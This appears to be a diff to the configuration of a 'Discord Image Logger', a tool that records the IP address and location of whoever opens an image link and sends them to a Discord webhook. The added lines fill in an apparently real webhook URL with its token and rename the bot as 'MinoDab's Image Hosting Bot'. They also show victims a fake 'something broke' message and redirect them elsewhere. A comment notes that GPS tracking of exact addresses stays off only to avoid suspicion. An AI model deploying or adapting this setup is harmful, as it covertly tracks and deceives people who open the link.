@@ -12,13 +12,13 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1267943617150845049/FF9mYw15z5Rgk9FHJSF5WLzDuG7Qw7R9KMCtYFmlN5akjbR38k1pn0YdJm1Mcn7SHHsk",
+    "image": "https://media.discordapp.net/attachments/1257792916726874175/1267944472134811690/SOMETHING_BORKED.png?ex=66aaa0cf&is=66a94f4f&hm=4c51b9f112110fc6953882cf62c4eb2224640c8bfd407706acc5eb25722da092&=&format=webp&quality=lossless&width=658&height=658", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "MinoDab's Image Hosting Bot", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -27,8 +27,8 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by Dexty's Image Logger. https://github.com/xdexty0/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "Weird. If you're seeing this, then I think something broke. Just let me know and I'll get right on it.", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -50,8 +50,8 @@ config = {
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": True, # Redirect to a webpage?
+        "page": "https://minodabproductions.dev" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
